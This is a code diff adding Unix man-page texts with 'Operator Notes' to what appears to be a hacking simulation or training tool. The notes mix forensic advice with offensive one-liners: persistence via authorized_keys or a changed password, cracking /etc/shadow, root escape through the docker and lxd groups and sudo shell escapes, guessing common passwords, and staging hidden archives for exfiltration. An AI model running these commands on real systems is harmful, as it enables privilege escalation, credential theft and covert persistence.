+              Display full login and logout times and dates.
+
+EXAMPLES
+       last
+              Show all recent logins.
+
+       last -n 20
+              Show last 20 login entries.
+
+       last username
+              Show logins for specific user.
+
+       last -x
+              Show system reboots and shutdowns.
+
+       lastb
+              Show failed login attempts.
+
+       last -f /var/log/wtmp.1
+              Check old wtmp file.
+
+OUTPUT FORMAT
+       username   tty     from_ip        login_time - logout_time (duration)
+       admin      pts/0   192.168.1.50   Mon Jan 15 09:30   still logged in
+
+OPERATOR NOTES
+       Use last when you need to:
+       • See who has logged into the system
+       • Track login times and sources
+       • Identify suspicious login patterns
+       • Find unauthorized access
+
+       Pro tip: Key forensic commands:
+       last                    # Recent logins
+       lastb                   # Failed attempts (brute force evidence)
+       last -x | grep reboot   # System reboots (covering tracks?)
+       last root               # Root login history
+
+       Look for: Unusual login times, unknown IPs, logins from
+       unexpected locations, multiple failed attempts (lastb).
+
+       Log files: /var/log/wtmp (logins), /var/log/btmp (failed)
+       Attackers may delete these to hide activity.
+
+SEE ALSO
+       who(1), w(1), lastlog(8), utmp(5)`,
+
+            'passwd': `PASSWD(1)                       User Commands                       PASSWD(1)
+
+NAME
+       passwd - change user password
+
+SYNOPSIS
+       passwd [options] [LOGIN]
+
+DESCRIPTION
+       passwd changes passwords for user accounts. A normal user may
+       only change the password for their own account, while the
+       superuser may change the password for any account.
+
+       -l, --lock
+              Lock the password of the named account.
+
+       -u, --unlock
+              Unlock the password of the named account.
+
+       -d, --delete
+              Delete user's password (make it empty).
+
+       -e, --expire
+              Immediately expire account's password.
+
+       -S, --status
+              Display account status information.
+
+EXAMPLES
+       passwd
+              Change your own password.
+
+       passwd username
+              Change another user's password (requires root).
+
+       passwd -l username
+              Lock user account.
+
+       passwd -u username
+              Unlock user account.
+
+       passwd -S username
+              Check password status.
+
+PASSWORD FILES
+       /etc/passwd    User account information (readable by all)
+       /etc/shadow    Encrypted passwords (root only)
+
+       Shadow file format:
+       username:$6$salt$hash:lastchange:min:max:warn:inactive:expire:
+
+       Hash types:
+       $1$  = MD5 (weak)
+       $5$  = SHA-256
+       $6$  = SHA-512 (current standard)
+
+OPERATOR NOTES
+       Use passwd when you need to:
+       • Change passwords after compromise
+       • Lock suspicious accounts
+       • Create password for new persistence account
+
+       Pro tip: Persistence via password change:
+       As root: passwd username
+       Set a password you know for later access.
+
+       Forensic check:
+       passwd -S username   # See if password changed recently
+       chage -l username    # Detailed password aging info
+
+       Password cracking target: /etc/shadow
+       Copy off-system and crack with hashcat/john:
+       cat /etc/shadow | grep -v '*' | grep -v '!'
+
+SEE ALSO
+       chage(1), shadow(5), usermod(8)`,
+
+            'stat': `STAT(1)                         User Commands                        STAT(1)
+
+NAME
+       stat - display file or file system status
+
+SYNOPSIS
+       stat [OPTION]... FILE...
+
+DESCRIPTION
+       Display file or file system status.
+
+       -c, --format=FORMAT
+              use the specified FORMAT instead of the default
+
+       -t, --terse
+              print the information in terse form
+
+       -f, --file-system
+              display file system status instead of file status
+
+FORMAT SEQUENCES
+       %a     access rights in octal
+       %A     access rights in human readable form
+       %f     raw mode in hex
+       %F     file type
+       %n     file name
+       %s     total size, in bytes
+       %U     user name of owner
+       %G     group name of owner
+       %x     time of last access
+       %y     time of last data modification
+       %z     time of last status change
+
+EXAMPLES
+       stat file.txt
+              Display detailed file information.
+
+       stat -c "%a %U %G %n" file.txt
+              Show octal permissions, owner, group, name.
+
+       stat -c "%y" file.txt
+              Show only modification time.
+
+OUTPUT
+       File: example.txt
+       Size: 1234       Blocks: 8       IO Block: 4096   regular file
+       Device: 802h/2050d  Inode: 12345   Links: 1
+       Access: (0644/-rw-r--r--)  Uid: (1000/user)  Gid: (1000/user)
+       Access: 2024-01-15 10:30:00.000000000 -0500
+       Modify: 2024-01-15 09:15:30.000000000 -0500
+       Change: 2024-01-15 09:15:30.000000000 -0500
+        Birth: 2024-01-10 08:00:00.000000000 -0500
+
+TIMESTAMPS
+       Access (atime) - When file was last read
+       Modify (mtime) - When file contents changed
+       Change (ctime) - When metadata changed (permissions, ownership)
+       Birth          - When file was created (if supported)
+
+OPERATOR NOTES
+       Use stat when you need to:
+       • Get detailed file timestamps for forensics
+       • Check exact permissions in octal
+       • Identify file type and ownership
+       • Detect timestamp manipulation
+
+       Pro tip: Forensic timeline analysis:
+       stat * | grep -E "(Access|Modify|Change):"
+       Look for timestamps that don't make sense:
+       - Modify time before Create time = timestomped
+       - All times identical = suspicious
+       - Access time = Modify time = never read after creation
+
+       Compare timestamps: stat -c "%y %n" * | sort
+
+SEE ALSO
+       ls(1), touch(1), file(1)`,
+
+            'file': `FILE(1)                         User Commands                        FILE(1)
+
+NAME
+       file - determine file type
+
+SYNOPSIS
+       file [options] file...
+
+DESCRIPTION
+       file tests each argument in an attempt to classify it. There are
+       three sets of tests, performed in this order: filesystem tests,
+       magic tests, and language tests.
+
+       -b, --brief
+              Do not prepend filenames to output lines.
+
+       -i, --mime
+              Output MIME type strings.
+
+       -L, --dereference
+              Follow symbolic links.
+
+       -z, --uncompress
+              Try to look inside compressed files.
+
+EXAMPLES
+       file document.pdf
+              Identify file type.
+
+       file *
+              Check all files in directory.
+
+       file -i image.png
+              Show MIME type.
+
+       file /bin/ls
+              Check if binary is ELF, statically/dynamically linked.
+
+       file suspicious_file
+              Identify unknown files.
+
+OUTPUT EXAMPLES
+       script.sh:    Bourne-Again shell script, ASCII text executable
+       binary:       ELF 64-bit LSB executable, x86-64, dynamically linked
+       archive.tar:  POSIX tar archive (GNU)
+       image.png:    PNG image data, 800 x 600, 8-bit/color RGB
+       document.pdf: PDF document, version 1.4
+       data.enc:     data (encrypted or binary)
+
+OPERATOR NOTES
+       Use file when you need to:
+       • Identify unknown files regardless of extension
+       • Detect file type masquerading (exe renamed to txt)
+       • Analyze malware samples
+       • Find hidden executables
+
+       Pro tip: Malware often disguises file types:
+       file *           # Check everything
+       file -b * | sort | uniq -c | sort -rn  # Type summary
+
+       Suspicious findings:
+       - ELF executables in /tmp
+       - Scripts with wrong extensions
+       - "data" type in unexpected places (encrypted/packed)
+
+       Quick sweep for executables:
+       file * | grep -E "(executable|script)"
+
+SEE ALSO
+       stat(1), ls(1), strings(1)`,
 
             'nohup': `NOHUP(1)                        User Commands                       NOHUP(1)
 
@@ -7057,6 +8472,82 @@ OPERATOR NOTES
 SEE ALSO
        fg(1), jobs(1)`,
 
+            'chage': `CHAGE(1)                        User Commands                       CHAGE(1)
+
+NAME
+       chage - change user password expiry information
+
+SYNOPSIS
+       chage [options] LOGIN
+
+DESCRIPTION
+       The chage command changes the number of days between password changes
+       and the date of the last password change. This information is used
+       by the system to determine when a user must change their password.
+
+OPTIONS
+       -l, --list
+              Show account aging information.
+
+       -d, --lastday LAST_DAY
+              Set date of last password change.
+
+       -E, --expiredate EXPIRE_DATE
+              Set account expiration date.
+
+       -I, --inactive INACTIVE
+              Set password inactive after expiration.
+
+       -m, --mindays MIN_DAYS
+              Set minimum days between password changes.
+
+       -M, --maxdays MAX_DAYS
+              Set maximum days between password changes.
+
+       -W, --warndays WARN_DAYS
+              Set number of days of warning before password expires.
+
+EXAMPLES
+       chage -l admin
+              View password aging info for admin.
+
+       chage -M 90 admin
+              Set password to expire every 90 days.
+
+       chage -E 2026-12-31 admin
+              Set account to expire on Dec 31, 2026.
+
+       chage -d 0 admin
+              Force password change on next login.
+
+OUTPUT OF chage -l
+       Last password change                : Jan 15, 2026
+       Password expires                    : never
+       Password inactive                   : never
+       Account expires                     : never
+       Minimum days between change         : 0
+       Maximum days between change         : 99999
+       Warning before expiration           : 7
+
+OPERATOR NOTES
+       Use chage when you need to:
+       • Audit when passwords were last changed
+       • Determine if accounts have expired
+       • Check password policies
+       • Investigate recent account activity
+
+       Pro tip: Forensic goldmine:
+       chage -l username                   # When was password changed?
+       for u in $(cut -d: -f1 /etc/passwd); do echo "==$u=="; chage -l $u; done
+       Look for: recent password changes during incident timeframe,
+       accounts with no expiration (persistence), accounts set to expire soon.
+
+       If password was changed around incident time, that account may be
+       compromised or used for persistence.
+
+SEE ALSO
+       passwd(1), shadow(5)`,
+
             'chmod': `CHMOD(1)                        User Commands                       CHMOD(1)
 
 NAME
@@ -7168,6 +8659,433 @@ OPERATOR NOTES
 
 SEE ALSO
        chmod(1), chgrp(1)`,
+
+            // Identity & Privilege Escalation
+            'id': `ID(1)                           User Commands                          ID(1)
+
+NAME
+       id - print real and effective user and group IDs
+
+SYNOPSIS
+       id [OPTION]... [USER]
+
+DESCRIPTION
+       Print user and group information for the specified USER, or (when USER
+       omitted) for the current user.
+
+       -u, --user
+              print only the effective user ID
+
+       -g, --group
+              print only the effective group ID
+
+       -G, --groups
+              print all group IDs
+
+       -n, --name
+              print a name instead of a number, for -ugG
+
+       -r, --real
+              print the real ID instead of the effective ID, with -ugG
+
+OUTPUT FORMAT
+       Without options, output looks like:
+       uid=1000(username) gid=1000(groupname) groups=1000(groupname),27(sudo)
+
+       uid    = User ID (0 = root)
+       gid    = Primary group ID
+       groups = All group memberships
+
+EXAMPLES
+       id
+              Show current user's identity.
+
+       id root
+              Show root's user and group info.
+
+       id -u
+              Print just the user ID number.
+
+       id -Gn
+              Print all group names (useful for privilege check).
+
+OPERATOR NOTES
+       Use id when you need to:
+       • Verify your current access level on a compromised system
+       • Check if you're in privileged groups (sudo, wheel, admin, docker)
+       • Understand what resources you can access
+       • First command to run after gaining a shell
+
+       Pro tip: Key groups that grant elevated privileges:
+       sudo/wheel  - Can run commands as root
+       docker      - Can escape to root via containers
+       lxd         - Can escape to root via containers
+       disk        - Raw disk access (read anything)
+       adm         - Can read logs in /var/log
+
+       id is your first recon command. Know who you are before
+       you try to become someone else.
+
+SEE ALSO
+       whoami(1), groups(1), getent(1)`,
+
+            'whoami': `WHOAMI(1)                       User Commands                       WHOAMI(1)
+
+NAME
+       whoami - print effective userid
+
+SYNOPSIS
+       whoami [OPTION]...
+
+DESCRIPTION
+       Print the user name associated with the current effective user ID.
+       Same as id -un.
+
+EXAMPLES
+       whoami
+              Print current username.
+
+OPERATOR NOTES
+       Use whoami when you need to:
+       • Quick check of current user context
+       • Verify privilege escalation worked
+       • Confirm shell identity after sudo/su
+
+       Pro tip: whoami is simpler than id but gives less info.
+       Use id for full context, whoami for quick checks.
+       After exploitation: whoami && id && pwd
+
+SEE ALSO
+       id(1), who(1), w(1)`,
+
+            'groups': `GROUPS(1)                       User Commands                       GROUPS(1)
+
+NAME
+       groups - print the groups a user is in
+
+SYNOPSIS
+       groups [OPTION]... [USERNAME]...
+
+DESCRIPTION
+       Print group memberships for each USERNAME or, if no USERNAME is
+       specified, for the current process.
+
+EXAMPLES
+       groups
+              Show groups for current user.
+
+       groups root
+              Show what groups root belongs to.
+
+       groups admin www-data
+              Show groups for multiple users.
+
+PRIVILEGED GROUPS
+       sudo / wheel    - Can execute commands as root via sudo
+       docker          - Can spawn root containers (privesc vector)
+       lxd             - Can spawn root containers (privesc vector)
+       disk            - Raw disk read/write access
+       adm             - Read access to /var/log
+       shadow          - Read access to /etc/shadow
+       video           - Access to framebuffer/video devices
+       plugdev         - Mount removable devices
+
+OPERATOR NOTES
+       Use groups when you need to:
+       • Enumerate current privileges quickly
+       • Check if user is in exploitable groups
+       • Identify privilege escalation paths via group membership
+
+       Pro tip: docker and lxd groups are instant root:
+       docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+       This mounts the host filesystem and gives root shell.
+
+       Always check: groups | grep -E "(sudo|wheel|docker|lxd|disk)"
+
+SEE ALSO
+       id(1), getent(1), usermod(8)`,
+
+            'sudo': `SUDO(8)                   System Manager's Manual                   SUDO(8)
+
+NAME
+       sudo - execute a command as another user
+
+SYNOPSIS
+       sudo -l
+       sudo [-u user] command
+       sudo -i
+       sudo -s
+
+DESCRIPTION
+       sudo allows a permitted user to execute a command as the superuser
+       or another user, as specified by the security policy.
+
+       -l, --list
+              List the allowed (and forbidden) commands for the invoking
+              user on the current host.
+
+       -u user, --user=user
+              Run the command as user instead of root.
+
+       -i, --login
+              Run the shell as a login shell (loads user's environment).
+
+       -s, --shell
+              Run the shell specified by the SHELL environment variable.
+
+       -k, --reset-timestamp
+              Invalidate the user's cached credentials.
+
+EXAMPLES
+       sudo -l
+              Show what commands you can run as root (CRITICAL first step).
+
+       sudo cat /etc/shadow
+              Read shadow file as root.
+
+       sudo -u www-data whoami
+              Execute command as www-data user.
+
+       sudo -i
+              Get interactive root shell.
+
+       sudo !!
+              Re-run last command with sudo.
+
+PRIVILEGE ESCALATION
+       sudo -l output reveals escalation paths:
+
+       (ALL) NOPASSWD: /usr/bin/vim
+              vim can spawn shell: :!/bin/bash
+
+       (ALL) NOPASSWD: /usr/bin/less /var/log/*
+              less can spawn shell: !sh
+
+       (ALL) NOPASSWD: /usr/bin/find
+              find can spawn shell: find . -exec /bin/sh \\; -quit
+
+       (ALL) NOPASSWD: /usr/bin/python3 *
+              python can spawn shell: import os; os.system("/bin/bash")
+
+       NOPASSWD means no password required - instant escalation.
+       Check GTFOBins for exploitation techniques per binary.
+
+OPERATOR NOTES
+       Use sudo when you need to:
+       • Execute commands with elevated privileges
+       • Enumerate what you can run as root (sudo -l)
+       • Pivot through sudo misconfigurations
+
+       Pro tip: sudo -l is ALWAYS your first privesc check.
+       Look for:
+       • NOPASSWD entries (no password needed)
+       • Wildcards in paths (/usr/bin/*)
+       • Text editors, interpreters, file viewers
+       • Commands you control the arguments to
+
+       Dangerous sudo entries (instant root):
+       vim, nano, less, more, man, awk, find, python, perl, ruby, bash
+
+SEE ALSO
+       su(1), sudoers(5), visudo(8)`,
+
+            'su': `SU(1)                           User Commands                          SU(1)
+
+NAME
+       su - run a command with substitute user and group ID
+
+SYNOPSIS
+       su [options] [-] [user [argument...]]
+
+DESCRIPTION
+       su allows to run commands with a substitute user and group ID.
+
+       When called without arguments, su defaults to running an interactive
+       shell as root.
+
+       -, -l, --login
+              Start the shell as a login shell (clean environment).
+
+       -c, --command=command
+              Pass command to the shell with -c.
+
+       -s, --shell=shell
+              Run the specified shell instead of the default.
+
+EXAMPLES
+       su
+              Switch to root (requires root password).
+
+       su -
+              Switch to root with login shell (clean environment).
+
+       su - admin
+              Switch to admin user with login shell.
+
+       su -c "cat /etc/shadow" root
+              Run single command as root.
+
+       su -s /bin/bash www-data
+              Switch to www-data using bash shell.
+
+SU VS SUDO
+       su requires the TARGET user's password
+       sudo requires YOUR password (if configured)
+
+       su -           Needs root password, gives root shell
+       sudo -i        Needs your password (if in sudoers), gives root shell
+
+       On most modern systems, sudo is preferred over su.
+
+OPERATOR NOTES
+       Use su when you need to:
+       • Switch to another user when you know their password
+       • Test access with credentials you've obtained
+       • Pivot between users on a compromised system
+
+       Pro tip: If you find credentials, try them with su:
+       su - username  # Use discovered password
+
+       Common passwords to try:
+       admin, password, root, toor, administrator
+
+       After cracking /etc/shadow, use su to test credentials.
+
+SEE ALSO
+       sudo(8), login(1), passwd(5)`,
+
+            'getent': `GETENT(1)                       User Commands                       GETENT(1)
+
+NAME
+       getent - get entries from Name Service Switch libraries
+
+SYNOPSIS
+       getent [option]... database [key]...
+
+DESCRIPTION
+       The getent command displays entries from databases supported by the
+       Name Service Switch libraries. These databases include passwd, group,
+       hosts, services, protocols, and networks.
+
+       If one or more key arguments are provided, only entries matching
+       the specified keys are displayed.
+
+DATABASES
+       passwd     User account information (/etc/passwd + LDAP/NIS)
+       group      Group information (/etc/group + LDAP/NIS)
+       shadow     Password hashes (requires root)
+       hosts      Host name resolution (/etc/hosts + DNS)
+       services   Network services (/etc/services)
+       protocols  Network protocols (/etc/protocols)
+
+EXAMPLES
+       getent passwd
+              List all users (local + network).
+
+       getent passwd admin
+              Get passwd entry for user 'admin'.
+
+       getent group sudo
+              Get group entry for 'sudo' group.
+
+       getent hosts localhost
+              Resolve hostname.
+
+OUTPUT FORMAT (passwd)
+       username:x:uid:gid:gecos:home:shell
+
+       Example:
+       admin:x:1000:1000:Administrator:/home/admin:/bin/bash
+       │     │ │    │    │             │           └── login shell
+       │     │ │    │    │             └── home directory
+       │     │ │    │    └── GECOS (full name/comment)
+       │     │ │    └── primary group ID
+       │     │ └── user ID
+       │     └── password placeholder (actual hash in /etc/shadow)
+       └── username
+
+OPERATOR NOTES
+       Use getent when you need to:
+       • List users from all sources (local + LDAP/AD)
+       • Look up specific user account details
+       • Verify user exists in the system
+       • Check group memberships
+
+       Pro tip: getent vs cat /etc/passwd:
+       • cat only shows LOCAL users
+       • getent shows ALL users (local + LDAP + NIS + AD)
+       Essential for networks with centralized authentication!
+
+       Useful commands:
+       getent passwd | cut -d: -f1          # All usernames
+       getent passwd | grep -v nologin      # Users with shells
+       getent group sudo                    # Who can sudo?
+
+SEE ALSO
+       passwd(5), group(5), nsswitch.conf(5)`,
+
+            'getfacl': `GETFACL(1)                     Access Control Lists                   GETFACL(1)
+
+NAME
+       getfacl - get file access control lists
+
+SYNOPSIS
+       getfacl [-aceEsRLPtpndvh] file ...
+
+DESCRIPTION
+       For each file, getfacl displays the file name, owner, the group,
+       and the Access Control List (ACL). If a directory has a default
+       ACL, getfacl also displays the default ACL.
+
+       ACLs extend standard Unix permissions (rwx for user/group/other)
+       to allow fine-grained access control for specific users and groups.
+
+       -a, --access
+              Display the file access control list.
+
+       -d, --default
+              Display the default access control list.
+
+       -R, --recursive
+              List ACLs of all files and directories recursively.
+
+OUTPUT FORMAT
+       # file: filename
+       # owner: username
+       # group: groupname
+       user::rwx              (owner permissions)
+       user:bob:rw-           (specific user 'bob' has rw)
+       group::r-x             (owning group permissions)
+       group:devs:rwx         (specific group 'devs' has rwx)
+       mask::rwx              (maximum permissions for named users/groups)
+       other::r--             (everyone else)
+
+EXAMPLES
+       getfacl file.txt
+              Display ACL for file.txt.
+
+       getfacl -R /var/www
+              Recursively show ACLs for web directory.
+
+       getfacl /etc/shadow
+              Check who has access to shadow file.
+
+OPERATOR NOTES
+       Use getfacl when you need to:
+       • Investigate why a user can access a file despite permissions
+       • Audit fine-grained access controls
+       • Find hidden access grants not visible with ls -l
+
+       Pro tip: Standard ls -l doesn't show ACLs. A + at the end of
+       permissions (drwxr-xr-x+) indicates ACLs are set.
+
+       Hidden backdoor technique: Attackers may add ACL entries to
+       grant themselves access while permissions look normal.
+
+       Check critical files: getfacl /etc/passwd /etc/shadow /etc/sudoers
+
+SEE ALSO
+       setfacl(1), chmod(1), chown(1)`,
 
             // Network
             'ifconfig': `IFCONFIG(8)             System Manager's Manual            IFCONFIG(8)
@@ -7821,6 +9739,685 @@ OPERATOR NOTES
 SEE ALSO
      ssh(1), sftp(1), rsync(1)`,
 
+            'ssh-keygen': `SSH-KEYGEN(1)            BSD General Commands Manual           SSH-KEYGEN(1)
+
+NAME
+     ssh-keygen - authentication key generation, management and conversion
+
+SYNOPSIS
+     ssh-keygen [-t type] [-b bits] [-f keyfile] [-C comment] [-N passphrase]
+
+DESCRIPTION
+     ssh-keygen generates, manages and converts authentication keys for SSH.
+     It can create RSA, ECDSA, or Ed25519 keys.
+
+OPTIONS
+     -t type
+             Specifies the type of key to create:
+             rsa      RSA key (default, widely compatible)
+             ecdsa    ECDSA key (faster, smaller)
+             ed25519  Ed25519 key (modern, recommended)
+
+     -b bits
+             Specifies the number of bits in the key:
+             RSA:     2048, 4096 (4096 recommended)
+             ECDSA:   256, 384, 521
+
+     -f filename
+             Specifies the filename of the key file.
+
+     -C comment
+             Provides a comment (usually email or description).
+
+     -N passphrase
+             Provides the new passphrase (empty string = no passphrase).
+
+     -p      Change passphrase of existing key file.
+
+     -y      Read private key and print public key.
+
+     -l      Show fingerprint of specified key file.
+
+     -R hostname
+             Removes all keys belonging to hostname from known_hosts.
+
+KEY FILES
+     ~/.ssh/id_rsa        RSA private key
+     ~/.ssh/id_rsa.pub    RSA public key
+     ~/.ssh/id_ed25519    Ed25519 private key
+     ~/.ssh/id_ed25519.pub Ed25519 public key
+     ~/.ssh/known_hosts   Known host keys
+     ~/.ssh/authorized_keys  Keys allowed to connect (on server)
+
+EXAMPLES
+     ssh-keygen
+             Generate default RSA key (interactive).
+
+     ssh-keygen -t ed25519 -C "user@example.com"
+             Generate Ed25519 key with comment.
+
+     ssh-keygen -t rsa -b 4096 -f ~/.ssh/mykey
+             Generate 4096-bit RSA key with custom name.
+
+     ssh-keygen -l -f ~/.ssh/id_rsa.pub
+             Show fingerprint of public key.
+
+     ssh-keygen -p -f ~/.ssh/id_rsa
+             Change passphrase on existing key.
+
+     ssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/id_rsa.pub
+             Regenerate public key from private key.
+
+     ssh-keygen -R hostname
+             Remove host from known_hosts (after server reinstall).
+
+OPERATOR NOTES
+     Use ssh-keygen when you need to:
+     • Generate keys for passwordless SSH access
+     • Create keys for persistence/backdoor access
+     • Verify key fingerprints
+     • Manage known_hosts
+
+     Pro tip: For persistence, add your public key to target's authorized_keys:
+     echo "your_public_key" >> ~/.ssh/authorized_keys
+
+     Check for existing keys: ls -la ~/.ssh/
+     Key files to exfiltrate: id_rsa (private - most valuable!)
+
+     Forensic check: Look at authorized_keys for unauthorized keys.
+     Attackers often add their own keys for persistent access.
+
+SEE ALSO
+     ssh(1), scp(1), ssh-agent(1)`,
+
+            'traceroute': `TRACEROUTE(8)           System Manager's Manual           TRACEROUTE(8)
+
+NAME
+     traceroute - print the route packets trace to network host
+
+SYNOPSIS
+     traceroute [-dnrvx] [-m max_ttl] [-p port] [-q nqueries]
+                [-s src_addr] [-w waittime] host [packetsize]
+
+DESCRIPTION
+     traceroute utilizes the IP protocol time-to-live field and attempts
+     to elicit an ICMP TIME_EXCEEDED response from each gateway along the
+     path to a host.
+
+OPTIONS
+     -n      Do not resolve IP addresses to hostnames.
+
+     -m max_ttl
+             Set the max time-to-live (max number of hops) used in outgoing
+             probe packets. Default is 30.
+
+     -q nqueries
+             Set the number of probes per hop. Default is 3.
+
+     -w waittime
+             Set the time (in seconds) to wait for a response. Default is 5.
+
+     -p port
+             Set the destination port number.
+
+     -I      Use ICMP ECHO instead of UDP datagrams.
+
+EXAMPLES
+     traceroute google.com
+             Trace route to Google's servers.
+
+     traceroute -n 192.168.1.1
+             Trace route without DNS resolution (faster).
+
+     traceroute -m 15 host
+             Limit to 15 hops max.
+
+     traceroute -I host
+             Use ICMP instead of UDP.
+
+OUTPUT FORMAT
+     traceroute to host (1.2.3.4), 30 hops max, 60 byte packets
+      1  gateway (192.168.1.1)  0.534 ms  0.432 ms  0.389 ms
+      2  isp-router (10.0.0.1)  12.543 ms  11.234 ms  10.983 ms
+      3  * * *
+      4  destination (1.2.3.4)  25.123 ms  24.567 ms  24.234 ms
+
+     Each line shows: hop number, hostname (IP), three response times.
+     * * * means no response (filtered/timeout).
+
+OPERATOR NOTES
+     Use traceroute when you need to:
+     • Map network topology and path to targets
+     • Identify intermediate routers and firewalls
+     • Diagnose network connectivity issues
+     • Understand network segmentation
+
+     Pro tip: * * * responses often indicate:
+     • Firewall blocking ICMP/UDP
+     • Router configured not to respond
+     • Network ACLs
+
+     Try traceroute -I (ICMP) if UDP is blocked.
+
+     Network recon: traceroute reveals internal network structure.
+     Document all hops during reconnaissance phase.
+
+SEE ALSO
+     ping(8), netstat(8), mtr(8)`,
+
+            // Archive/Transfer
+            'tar': `TAR(1)                          User Commands                         TAR(1)
+
+NAME
+       tar - an archiving utility
+
+SYNOPSIS
+       tar [OPTION...] [FILE]...
+
+DESCRIPTION
+       GNU tar is an archiving program designed to store multiple files
+       in a single file (an archive), and to manipulate such archives.
+
+COMMON OPTIONS
+       -c, --create
+              create a new archive
+
+       -x, --extract
+              extract files from an archive
+
+       -t, --list
+              list the contents of an archive
+
+       -v, --verbose
+              verbosely list files processed
+
+       -f, --file=ARCHIVE
+              use archive file (REQUIRED for most operations)
+
+       -z, --gzip
+              filter through gzip (for .tar.gz / .tgz)
+
+       -j, --bzip2
+              filter through bzip2 (for .tar.bz2)
+
+       -C, --directory=DIR
+              change to directory DIR before performing operations
+
+EXAMPLES
+       tar -czvf archive.tar.gz directory/
+              Create gzipped archive.
+
+       tar -xzvf archive.tar.gz
+              Extract gzipped archive.
+
+       tar -xzvf archive.tar.gz -C /tmp/
+              Extract to specific directory.
+
+       tar -tzvf archive.tar.gz
+              List contents without extracting.
+
+       tar -czvf backup.tar.gz /etc /home
+              Archive multiple directories.
+
+COMMON EXTENSIONS
+       .tar        Uncompressed archive
+       .tar.gz     Gzip compressed (most common)
+       .tgz        Same as .tar.gz
+       .tar.bz2    Bzip2 compressed (better ratio, slower)
+       .tar.xz     XZ compressed (best ratio, slowest)
+
+OPERATOR NOTES
+       Use tar when you need to:
+       • Package files for exfiltration
+       • Create backups before modification
+       • Extract downloaded tools/exploits
+
+       Pro tip: Exfiltration staging:
+       tar -czvf /tmp/.data.tar.gz /home/user/Documents /etc/passwd
+       Dot-prefix hides from casual ls.
+
+       Quick extract common archives:
+       tar -xvf file.tar
+       tar -xzvf file.tar.gz
+       tar -xjvf file.tar.bz2
+
+SEE ALSO
+       gzip(1), bzip2(1), zip(1)`,
+
+            'gzip': `GZIP(1)                         User Commands                        GZIP(1)
+
+NAME
+       gzip, gunzip - compress or expand files
+
+SYNOPSIS
+       gzip [OPTION]... [FILE]...
+       gunzip [OPTION]... [FILE]...
+
+DESCRIPTION
+       gzip reduces the size of the named files using Lempel-Ziv coding (LZ77).
+       Each file is replaced by one with the extension .gz, maintaining
+       ownership, modes, and timestamps.
+
+       gunzip decompresses files created by gzip.
+
+OPTIONS
+       -c, --stdout
+              Write on standard output, keep original files unchanged.
+
+       -d, --decompress
+              Decompress (same as gunzip).
+
+       -f, --force
+              Force compression/decompression even if file has multiple
+              links or the corresponding file already exists.
+
+       -k, --keep
+              Keep (don't delete) input files during compression.
+
+       -l, --list
+              List compressed file contents.
+
+       -r, --recursive
+              Travel the directory structure recursively.
+
+       -v, --verbose
+              Verbose output.
+
+       -1 to -9
+              Regulate compression speed: -1 fastest, -9 best compression.
+
+EXAMPLES
+       gzip file.txt
+              Compress file.txt → file.txt.gz (original deleted).
+
+       gzip -k file.txt
+              Compress and keep original.
+
+       gzip -d file.txt.gz
+              Decompress (same as gunzip file.txt.gz).
+
+       gzip -c file.txt > file.txt.gz
+              Compress to stdout, keep original.
+
+       gzip -l file.txt.gz
+              Show compression info.
+
+       gzip -r directory/
+              Recursively compress all files in directory.
+
+OPERATOR NOTES
+       Use gzip when you need to:
+       • Compress files before transfer (faster exfil)
+       • Decompress downloaded archives
+       • Reduce log file sizes
+
+       Pro tip: gzip is single-file compression (unlike tar which archives).
+       For multiple files: tar -czvf archive.tar.gz files...
+
+       Common patterns:
+       cat file.gz | gzip -d        # Decompress to stdout
+       gzip -dc file.gz | grep x    # Search in compressed file
+
+SEE ALSO
+       gunzip(1), tar(1), bzip2(1), xz(1)`,
+
+            'gunzip': `GUNZIP(1)                       User Commands                       GUNZIP(1)
+
+NAME
+       gunzip - decompress files
+
+SYNOPSIS
+       gunzip [OPTION]... [FILE]...
+
+DESCRIPTION
+       gunzip takes a list of files on its command line and replaces each
+       file with .gz extension with the original uncompressed version.
+
+       gunzip is equivalent to gzip -d.
+
+OPTIONS
+       -c, --stdout
+              Write output to stdout, keep original compressed file.
+
+       -f, --force
+              Force decompression even if file has multiple links.
+
+       -k, --keep
+              Keep (don't delete) input files.
+
+       -l, --list
+              List compression information.
+
+       -v, --verbose
+              Verbose mode.
+
+EXAMPLES
+       gunzip file.txt.gz
+              Decompress file.txt.gz → file.txt
+
+       gunzip -k file.txt.gz
+              Decompress and keep compressed file.
+
+       gunzip -c file.txt.gz > output.txt
+              Decompress to different filename.
+
+       gunzip -c file.txt.gz | head
+              View start of compressed file.
+
+OPERATOR NOTES
+       Use gunzip when you need to:
+       • Decompress .gz files
+       • View contents of compressed logs
+       • Extract downloaded compressed files
+
+       Pro tip: Many logs are stored compressed:
+       gunzip -c /var/log/syslog.2.gz | grep error
+
+       zcat is equivalent to gunzip -c (decompress to stdout)
+       zgrep searches compressed files directly
+
+SEE ALSO
+       gzip(1), zcat(1), zgrep(1)`,
+
+            'zip': `ZIP(1)                          User Commands                         ZIP(1)
+
+NAME
+       zip - package and compress files
+
+SYNOPSIS
+       zip [options] zipfile files...
+
+DESCRIPTION
+       zip is a compression and file packaging utility. It is compatible
+       with PKZIP and WinZip.
+
+OPTIONS
+       -r, --recurse-paths
+              Travel the directory structure recursively.
+
+       -e, --encrypt
+              Encrypt the contents of the zipfile using a password.
+
+       -P password
+              Use password for encryption (insecure - visible in ps).
+
+       -u, --update
+              Update existing entries if newer on the file system.
+
+       -m, --move
+              Move files into zipfile (delete originals).
+
+       -j, --junk-paths
+              Store just the name, junk the path.
+
+       -q, --quiet
+              Quiet operation.
+
+       -v, --verbose
+              Verbose operation.
+
+       -0 to -9
+              Compression level: 0=store only, 9=maximum compression.
+
+EXAMPLES
+       zip archive.zip file1 file2
+              Create archive with two files.
+
+       zip -r archive.zip directory/
+              Recursively zip directory.
+
+       zip -e secure.zip sensitive.doc
+              Create password-protected zip (prompts for password).
+
+       zip -P secret archive.zip files
+              Create encrypted zip with inline password (insecure).
+
+       zip -u archive.zip newfile
+              Add/update file in existing archive.
+
+       zip -j archive.zip /path/to/file
+              Store file without path.
+
+OPERATOR NOTES
+       Use zip when you need to:
+       • Create Windows-compatible archives
+       • Password-protect files for transfer
+       • Package files for exfiltration
+
+       Pro tip: zip encryption is WEAK (ZipCrypto).
+       For real security, use: 7z with AES-256, or gpg.
+
+       Stealth exfil: zip -q -r /tmp/.backup.zip /home/target/Documents
+
+SEE ALSO
+       unzip(1), tar(1), gzip(1), 7z(1)`,
+
+            'unzip': `UNZIP(1)                        User Commands                       UNZIP(1)
+
+NAME
+       unzip - list, test, or extract compressed files from a ZIP archive
+
